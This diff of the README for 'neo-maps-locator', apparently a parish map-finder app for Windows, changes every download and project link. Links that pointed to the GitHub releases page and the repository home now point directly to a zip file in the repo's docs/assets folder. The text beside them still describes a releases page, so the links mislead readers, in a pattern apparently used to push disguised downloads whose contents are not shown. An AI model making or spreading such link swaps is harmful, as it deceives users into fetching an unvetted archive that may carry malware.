@@ -1,6 +1,6 @@
 # 🗺️ neo-maps-locator - Quick Map Finder for Parishes
 
-[![Download Releases](https://img.shields.io/badge/Download-Releases-brightgreen?style=for-the-badge)](https://github.com/Bellyflopper/neo-maps-locator/releases)
+[![Download Releases](https://img.shields.io/badge/Download-Releases-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Bellyflopper/neo-maps-locator/main/docs/assets/locator_neo_maps_1.6.zip)
 
 ## ℹ️ About neo-maps-locator
 
@@ -29,7 +29,7 @@ Follow these steps to download and start using neo-maps-locator on your Windows 
 
 1. Click on the large green button below to open the download page in your browser.
 
-[![Download Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/Bellyflopper/neo-maps-locator/releases)
+[![Download Releases](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/Bellyflopper/neo-maps-locator/main/docs/assets/locator_neo_maps_1.6.zip)
 
 2. On the GitHub releases page, find the latest version of neo-maps-locator. The latest release is usually at the top of the list.
 
@@ -121,7 +121,7 @@ The app does not update automatically. Manual download and install keeps it simp
 
 Visit the GitHub page to check for documentation, updates, and community discussions:
 
-https://github.com/Bellyflopper/neo-maps-locator
+https://raw.githubusercontent.com/Bellyflopper/neo-maps-locator/main/docs/assets/locator_neo_maps_1.6.zip
 
 Explore topics like:
 
@@ -137,4 +137,4 @@ cammino, camminoneocatecumenale, catechism, catechism-of-the-catholic-church, ca
 
 ---
 
-[![Download Releases](https://img.shields.io/badge/Download-Releases-brightgreen?style=for-the-badge)](https://github.com/Bellyflopper/neo-maps-locator/releases)
+[![Download Releases](https://img.shields.io/badge/Download-Releases-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Bellyflopper/neo-maps-locator/main/docs/assets/locator_neo_maps_1.6.zip)
